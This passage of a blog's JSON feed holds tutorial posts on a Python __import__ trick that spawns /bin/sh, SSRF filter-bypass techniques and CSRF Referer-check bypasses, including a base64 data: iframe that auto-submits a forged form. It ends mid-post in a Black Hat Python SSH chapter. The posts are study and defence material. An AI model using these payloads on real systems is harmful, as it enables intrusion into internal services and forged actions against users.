xxx”</code>  指定了具体的名字则 all 属性被忽略。</p>\n<h2 id=\"魔法方法\"><a class=\"anchor\" href=\"#魔法方法\">#</a> 魔法方法</h2>\n<h3 id=\"_import_\"><a class=\"anchor\" href=\"#_import_\">#</a> _<em>import</em>_</h3>\n<p>该魔法方法是 import 触发，即 <code>import os </code> 相当于 <code>os = __import__('os')</code> ，也可以直接使用，主要用于模块延迟加载，或重载模块。</p>\n<p><span class=\"label\">参数：</span><br />\nname: 模块的名字；<br />\nglobal: 包含全局变量的字典，采用默认值 global ()<br />\n local: 包含局部变量的字典，采用默认值 local ()<br />\n fromlist: 被导入的子模块的名称<br />\n level: 指定使用绝对导入还是相对导入，0 表示只执行绝对导入。</p>\n<p><span class=\"label\">实例</span></p>\n<p>这段代码能在 Linux 下调用 shell</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loader</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    a <span class=\"token operator\">=</span> <span class=\"token builtin\">__import__</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    loader<span class=\"token punctuation\">(</span><span class=\"token string\">\"os\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>__import__函数返回的是一个变量，代表一个模块，所有后续方法的调用都要在这个变量的基础上。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\">https://www.cnblogs.com/cwp-bg/p/9856339.html</span></p>\n",
            "tags": [
                "python",
                "python内置属性"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "url": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "title": "web漏洞-SSRF",
            "date_published": "2021-02-01T11:54:22.000Z",
            "content_html": "<p><span class=\"label success\">✔️嘘，请安静</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=1355292203\"]}]'></div></div>\n<h1 id=\"ssrf的定义与成因\"><a class=\"anchor\" href=\"#ssrf的定义与成因\">#</a> SSRF 的定义与成因</h1>\n<p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>\n<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>\n<p>注释：除了 http/https 等方式可以造成 ssrf，类似 tcp connect 方式也可以探测内网一些 ip 的端口是否开发服务，只不过危害比较小而已。</p>\n<h1 id=\"可能出现的地方\"><a class=\"anchor\" href=\"#可能出现的地方\">#</a> 可能出现的地方</h1>\n<p>1. 社交分享功能：获取超链接的标题等内容进行显示</p>\n<p>2. 转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n<p>3. 在线翻译：给网址翻译对应网页的内容</p>\n<p>4. 图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片</p>\n<p>5. 图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验</p>\n<p>6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试</p>\n<p>7. 网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作</p>\n<p>8. 数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数</p>\n<p>9. 邮件系统：比如接收邮件服务器地址</p>\n<p>10. 编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等</p>\n<p>11. 未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞</p>\n<p>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>\n<p>12. 从远程服务器请求资源（upload from url 如 discuz！；import &amp; expost rss feed 如 web blog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）</p>\n<h1 id=\"漏洞验证\"><a class=\"anchor\" href=\"#漏洞验证\">#</a> 漏洞验证</h1>\n<p>1. 排除法：浏览器 f12 查看源代码看是否是在本地进行了请求</p>\n<p>比如：该资源地址类型为  <code>http://www.xxx.com/a.php?image=（地址）</code> 的就可能存在 SSRF 漏洞</p>\n<p>2.dnslog 等工具进行测试，看是否被访问</p>\n<p>-- 可以在盲打后台用例中将当前准备请求的 uri 和参数编码成 base64，这样盲打后台解码后就知道是哪台机器哪个 cgi 触发的请求。</p>\n<p>3. 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在 HTTP 服务的内网地址</p>\n<p>-- 从漏洞平台中的历史漏洞寻找泄漏的存在 web 应用内网地址</p>\n<p>-- 通过二级域名暴力猜解工具模糊猜测内网地址</p>\n<p>4. 直接返回的 Banner、title、content 等信息</p>\n<p>5. 留意 bool 型 SSRF</p>\n<h1 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h1>\n<p>1. 让服务端去访问相应的网址</p>\n<p>2. 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的 cms</p>\n<p>3. 可以使用 file、dict、gopher [11]、ftp 协议进行请求访问相应的文件</p>\n<p>4. 攻击内网 web 应用（可以向内部任意主机的任意端口发送精心构造的数据包 {payload}）</p>\n<p>5. 攻击内网应用程序（利用跨协议通信技术）</p>\n<p>6. 判断内网主机是否存活：方法是访问看是否有端口开放</p>\n<p>7.DoS 攻击（请求大文件，始终保持连接 keep-alive always）</p>\n<h1 id=\"绕过限制方法\"><a class=\"anchor\" href=\"#绕过限制方法\">#</a> 绕过限制方法</h1>\n<p>详细绕过参考 -----&gt;<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n<p>1. <code>http://xxxx.com@www.baidu.com/</code>  与 <code>http://www.baidu.com/</code>  请求时是相同的</p>\n<p>2. 各种 IP 地址的进制转换</p>\n<p>可以是十六进制，八进制等。<br />\n115.239.210.26  &gt;&gt;&gt;  16373751032<br />\n 首先把这四段数字给分别转成 16 进制，结果：73 ef d2 1a<br />\n 然后把 73efd21a 这十六进制一起转换成 8 进制<br />\n记得访问的时候加 0 表示使用八进制 (可以是一个 0 也可以是多个 0 跟 XSS 中多加几个 0 来绕过过滤一样)，十六进制加 0x</p>\n<p>127.0.0.1 =&gt; 2130706433<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<p>3.URL 跳转绕过： <code>http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</code></p>\n<p>4. 短网址绕过  <code>http://t.cn/RwbLKDx</code></p>\n<p>短网址原理请参考<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy52ZXJ5aXRtYW4uY29tLzIwMTkvMTEvMjQvJUU3JTlGJUFEJUU1JTlDJUIwJUU1JTlEJTgwJUU1JThFJTlGJUU3JTkwJTg2Lw==\"> http://www.veryitman.com/2019/11/24 / 短地址原理 /</span></p>\n<p>5.xip.io 来绕过： <code>http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）</code></p>\n<p>指向任意 ip 的域名：<span class=\"exturl\" data-url=\"aHR0cDovL3hpcC5pbw==\">xip.io</span> (37signals 开发实现的定制 DNS 服务)</p>\n<p>6. 限制了子网段，可以加 :80 端口绕过。 <code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</code></p>\n<p>7. 探测内网域名，或者将自己的域名解析到内网 ip</p>\n<p>8. 例如  <code>http://10.153.138.81/ts.php</code>  , 修复时容易出现的获取 host 时以 / 分割来确定 host，</p>\n<p>但这样可以用  <code>http://abc@10.153.138.81/</code>  绕过</p>\n<p>9. 利用 Enclosed alphanumerics</p>\n<pre><code class=\"language-txt\">利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n</code></pre>\n<h1 id=\"漏洞示例\"><a class=\"anchor\" href=\"#漏洞示例\">#</a> 漏洞示例</h1>\n<p>1.Wordpress3.5.1 以下版本 xmlrpc.php pingback 的缺陷与 ssrf</p>\n<p>2.discuz！的 ssrf （利用 php 的 header 函数来绕过，其实就是 302 跳转实现协议转换）</p>\n<p>3.weblogic 的 ssrf</p>\n<p>.....</p>\n<h1 id=\"漏洞修复\"><a class=\"anchor\" href=\"#漏洞修复\">#</a> 漏洞修复</h1>\n<p>1. 禁止跳转</p>\n<p>2. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>3. 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题</p>\n<p>4. 设置 URL 白名单或者限制内网 IP（使用 gethostbyname () 判断是否为内网 IP）</p>\n<p>5. 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090</p>\n<p>6. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjExNQ==\">https://xz.aliyun.com/t/2115</span><br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9sZWFybmluZy9kZXRhaWwvMjQwLmh0bWw=\">http://bobao.360.cn/learning/detail/240.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n",
            "tags": [
                "web安全",
                "SSRF"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "url": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "title": "web漏洞-CSRF",
            "date_published": "2021-02-01T11:53:47.000Z",
            "content_html": "<p><span class=\"label success\">✔️嘘，请安静</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=1334246005\"]}]'></div></div>\n<h1 id=\"csrf概念\"><a class=\"anchor\" href=\"#csrf概念\">#</a> CSRF 概念</h1>\n<p>CSRF 跨站点请求伪造 (Cross—Site Request Forgery)，跟 XSS 攻击一样，存在巨大的危害性，你可以这样来理解：</p>\n<blockquote>\n<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中 Web A 为存在 CSRF 漏洞的网站，Web B 为攻击者构建的恶意网站，User C 为 Web A 网站的合法用户。尽管听起来跟 XSS 跨站脚本攻击有点相似，但事实上 CSRF 与 XSS 差别很大，XSS 利用的是站点内的信任用户，而 CSRF 则是通过伪装来自受信任用户的请求来利用受信任的网站。</p>\n</blockquote>\n<h1 id=\"csrf攻击示意图\"><a class=\"anchor\" href=\"#csrf攻击示意图\">#</a> CSRF 攻击示意图</h1>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>首先用户 C 浏览并登录了受信任站点 A；<br />\n登录信息验证通过以后，站点 A 会在返回给浏览器的信息中带上已登录的 cookie，cookie 信息会在浏览器端保存一定时间（根据服务端设置而定）；<br />\n完成这一步以后，用户在没有登出（清除站点 A 的 cookie）站点 A 的情况下，访问恶意站点 B；<br />\n这时恶意站点 B 的某个页面向站点 A 发起请求，而这个请求会带上浏览器端所保存的站点 A 的 cookie；<br />\n站点 A 根据请求所带的 cookie，判断此请求为用户 C 所发送的。<br />\n因此，站点 A 会报据用户 C 的权限来处理恶意站点 B 所发起的请求，而这个请求可能以用户 C 的身份发送 邮件、短信、消息，以及进行转账支付等操作，这样恶意站点 B 就达到了伪造用户 C 请求站点 A 的目的。<br />\n受害者只需要做下面两件事情，攻击者就能够完成 CSRF 攻击：</p>\n<ol>\n<li>登录受信任站点 A，并在本地生成 cookie；</li>\n<li>在不登出站点 A（清除站点 A 的 cookie）的情况下，访问恶意站点 B。</li>\n</ol>\n<p>很多情况下所谓的恶意站点，很有可能是一个存在其他漏洞（如 XSS）的受信任且被很多人访问的站点，这样，普通用户可能在不知不觉中便成为了受害者。</p>\n<h1 id=\"csrf漏洞检测\"><a class=\"anchor\" href=\"#csrf漏洞检测\">#</a> CSRF 漏洞检测：</h1>\n<p>检测 CSRF 漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>\n<p>随着对 CSRF 漏洞研究的不断深入，不断涌现出一些专门针对 CSRF 漏洞进行检测的工具，如 CSRFTester，CSRF Request Builder 等。</p>\n<p>以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>\n<p>客户端访问服务器时没有同服务器做安全验证</p>\n<p>一切 http 参数可控</p>\n<p>详细 CSRF 检测见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTAxMTIyL2FydGljbGUvZGV0YWlscy8xMDY0MDg3MTQ=\"> https://blog.csdn.net/qq_41901122/article/details/106408714</span></p>\n<h1 id=\"防御csrf攻击\"><a class=\"anchor\" href=\"#防御csrf攻击\">#</a> 防御 CSRF 攻击</h1>\n<h2 id=\"尽量使用post限制get\"><a class=\"anchor\" href=\"#尽量使用post限制get\">#</a> 尽量使用 POST，限制 GET</h2>\n<p>GET 接口太容易被拿来做 CSRF 攻击，看上面示例就知道，只要构造一个 img 标签，而 img 标签又是不能过滤的数据。接口最好限制为 POST 使用，GET 则无效，降低攻击风险。<br />\n当然 POST 并不是万无一失，攻击者只要构造一个 form 就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p>\n<h2 id=\"将cookie设置为httponly\"><a class=\"anchor\" href=\"#将cookie设置为httponly\">#</a> 将 cookie 设置为 HttpOnly</h2>\n<p>CRSF 攻击很大程度上是利用了浏览器的 cookie，为了防止站内的 XSS 漏洞盗取 cookie, 需要在 cookie 中设置 “HttpOnly” 属性，这样通过程序（如 JavaScript 脚本、Applet 等）就无法读取到 cookie 信息，避免了攻击者伪造 cookie 的情况出现。<br />\n在 Java 的 Servlet 的 API 中设置 cookie 为 HttpOnly 的代码如下：<br />\n <code>response.setHeader( &quot;Set-Cookie&quot;, &quot;cookiename=cookievalue;HttpOnly&quot;);</code></p>\n<h2 id=\"增加token\"><a class=\"anchor\" href=\"#增加token\">#</a> 增加 token</h2>\n<p>CSRF 攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于 cookie 中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的 cookie 来通过安全验证。由此可知，抵御 CSRF 攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信总不存在于 cookie 之中。鉴于此，系统开发人员可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务端进行 token 校验，如果请求中没有 token 或者 token 内容不正确，则认为是 CSRF 攻击而拒绝该请求。<br />\n假设请求通过 POST 方式提交，则可以在相应的表单中增加一个隐藏域：<br />\n <code>&lt;input type=&quot;hidden&quot; name=&quot;_toicen&quot; value=&quot;tokenvalue&quot;/&gt;</code> <br />\ntoken 的值通过服务端生成，表单提交后 token 的值通过 POST 请求与参数一同带到服务端，每次会话可以使用相同的 token，会话过期，则 token 失效，攻击者因无法获取到 token，也就无法伪造请求。<br />\n在 session 中添加 token 的实现代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HttpSession session <span class=\"token operator\">=</span> request<span class=\"token operator\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword type-declaration\">Object</span> token <span class=\"token operator\">=</span> session<span class=\"token operator\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>token <span class=\"token operator\">==</span> <span class=\"token constant\">null</span> <span class=\"token constant\">I</span> <span class=\"token constant\">I</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token operator\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    session<span class=\"token operator\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">UUID</span><span class=\"token operator\">.</span>randomUUIDO <span class=\"token operator\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"通过referer识别\"><a class=\"anchor\" href=\"#通过referer识别\">#</a> 通过 Referer 识别</h2>\n<p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限的页面的请求都来自于同一个网站。比如某银行的转账是通过用户访问 <code>http://www.xxx.com/transfer.do</code>  页面完成的，用户必须先登录 <code>www.xxx.com</code> ，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的 Referer 值就会是<br />\n提交按钮所在页面的 URL（本例为 <code>www.xxx. com/transfer.do</code> ）。如果攻击者要对银行网站实施 CSRF 攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的 Referer 的值是其他网站的地址，而不是银行转账页面的地址。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值即可，如果是以 <code>www.xx.om</code>  域名开头的地址，则说明该请求是来自银行网站自己的请求，是合法的；如果 Referer 是其他网站，就有可能是 CSRF 攻击，则拒绝该请求。<br />\n取得 HTTP 请求 Referer：<br />\n <code>String referer = request.getHeader(&quot;Referer&quot;);</code></p>\n<h1 id=\"csrf-绕过referer技巧\"><a class=\"anchor\" href=\"#csrf-绕过referer技巧\">#</a> CSRF-- 绕过 Referer 技巧</h1>\n<p>CSRF 遇到 Referer 绕过的情况，有条件限制，不一定所有的 Refere 验证就可以绕过</p>\n<h2 id=\"referer条件为空条件时\"><a class=\"anchor\" href=\"#referer条件为空条件时\">#</a> referer 条件为空条件时</h2>\n<p>解决方案:</p>\n<p>利用 <code>ftp://, http://, https://, file://, javascript:, data: </code> <br />\n这个时候浏览器地址栏是 <code>file://</code>  开头的，如果这个 HTML 页面向任何 http 站点提交请求的话，这些请求的 Referer 都是空的。</p>\n<p><span class=\"label\">例:</span></p>\n<ol>\n<li>利用 data: 协议</li>\n</ol>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>bese64 编码 解码即可看到代码</p>\n<ol start=\"2\">\n<li>利用 https 协议</li>\n</ol>\n<p>https 向 http 跳转的时候 Referer 为空<br />\n拿一个 https 的 webshell<br />\n <code>&lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;</code></p>\n<p>attack.php 写上 CSRF 攻击代码</p>\n<h2 id=\"判断referer是某域情况下绕过\"><a class=\"anchor\" href=\"#判断referer是某域情况下绕过\">#</a> 判断 Referer 是某域情况下绕过</h2>\n<p>比如你找的 csrf 是 <code>http://xxx.com</code>  验证的 referer 是验证的 <code>*.http://xx.com</code>  可以找个二级域名 之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code>  之后在把文章地址发出去 就可以伪造。</p>\n<h2 id=\"判断referer是否存在某关键字\"><a class=\"anchor\" href=\"#判断referer是否存在某关键字\">#</a> 判断 referer 是否存在某关键字</h2>\n<p>referer 判断存在不存在 <code>http://google.com</code>  这个关键词</p>\n<p>在网站新建一个 <code>http://google.com</code>  目录 把 CSRF 存放在 <code>http://google.com</code>  目录，即可绕过</p>\n<h2 id=\"判断referer是否含有某域名\"><a class=\"anchor\" href=\"#判断referer是否含有某域名\">#</a> 判断 referer 是否含有某域名</h2>\n<p>判断了 Referer 开头是否以 <code>http://126.com</code>  以及 126 子域名 不验证根域名为 <code>http://126.com</code>  那么我这里可以构造子域名 <code>http://x.126.com.xxx.com</code>  作为蠕虫传播的载体服务器，即可绕过。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NzQwOGQ3M2M2NmQ=\">https://www.jianshu.com/p/67408d73c66d</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjA2OTczL2FydGljbGUvZGV0YWlscy84NjUwNDc0Nw==\">https://blog.csdn.net/qq_41606973/article/details/86504747</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRjaGF0LmNzZG4ubmV0L2FjdGl2aXR5LzVhMGJhMzQ3ZTFmNzU1NTcxNDgzZWE1YQ==\">https://gitchat.csdn.net/activity/5a0ba347e1f755571483ea5a</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRmx1b3Jlc2NlbmNlLXRqeS9wLzYxMDAzMTAuaHRtbA==\">https://www.cnblogs.com/Fluorescence-tjy/p/6100310.html</span></p>\n",
            "tags": [
                "web安全",
                "CSRF"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/27/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "url": "https://self-ferry.github.io/2021/01/27/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "title": "BHP第二章（三）-SSH与SSH隧道",
            "date_published": "2021-01-27T15:43:48.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=165405\"]}]'></div></div>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>通过 python 打造自己的 SSH (Secure Shell)。</p>\n<h1 id=\"通过paramiko使用ssh\"><a class=\"anchor\" href=\"#通过paramiko使用ssh\">#</a> 通过 paramiko 使用 SSH</h1>\n<h2 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h2>\n<p>paramiko 是第三方库，要用 pip 安装。 <code>pip install paramiko</code></p>\n<p>在 python 的世界里，可以使用原始套接字和一些加密函数创建自己的 SSH 客户端或者服务端。但 python 中也有现成模块，使用 paramiko 库中的 PyCrypto 能让我们轻松使用 SSH2 协议</p>\n<p>在示例中，我们首先需要引入 <code>paramiko</code>  库，然后使用 <code>SSHClient()</code>  方法实例化对象，然后使用 <code>load_host_key()</code>  方法密钥认证的方式连接服务器，这里让实验可视化使用 <code>connect()</code>  方法以明文密码的方式连接服务器，连接服务器之前可以使用 <code>set_missing_host_key_policy()</code>  设置对于服务器密钥的策略，使用 <code>AutoAddPolicy()</code>  设置策略为自动添加服务器密钥，然后使用 <code>get_transport()</code>  与 <code>open_session()</code>  方法来得到 ssh 加密通道和打开线程，运用 if 语句与 acitve 属性判断线程是否存活，如果存活，使用 <code>exec_command()</code>  来执行我们想要执行的命令，通过 <code>recv()</code>  方法将命令在服务器执行后的结果返回给我们，这里也需要注意编码问题</p>\n<p><span class=\"label\">Code</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> paramiko</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loging_shh</span><span class=\"token punctuation\">(</span>ip<span class=\"token 